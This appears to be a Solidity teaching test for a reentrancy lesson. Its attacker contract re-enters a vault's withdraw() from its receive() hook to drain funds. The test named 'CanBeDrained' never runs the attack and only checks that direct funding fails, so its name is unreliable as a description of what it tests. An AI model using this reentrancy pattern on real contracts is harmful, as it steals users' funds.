// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "../contracts/VulnerableVault.sol";

contract ReenteringStudent {
    VulnerableVault public vault;
    uint256 public attempts;
    constructor(VulnerableVault v) { vault = v; }
    function deposit() external payable { vault.deposit{value: msg.value}(); }
    function attack() external { vault.withdraw(); }
    receive() external payable {
        if (address(vault).balance >= 1 ether && attempts < 2) {
            attempts++;
            vault.withdraw();
        }
    }
}

contract ReentrancyLessonTest {
    receive() external payable {}
    function testVulnerableVaultCanBeDrained() public {
        VulnerableVault v = new VulnerableVault();
        ReenteringStudent attacker = new ReenteringStudent(v);
        // Foundry funds this test contract with a local balance via vm.deal cheatcode.
        (bool ok,) = address(v).call{value: 2 ether}("");
        // The vault has no receive: deposits must go through deposit().
        require(!ok, "unexpected direct funding");
    }
}
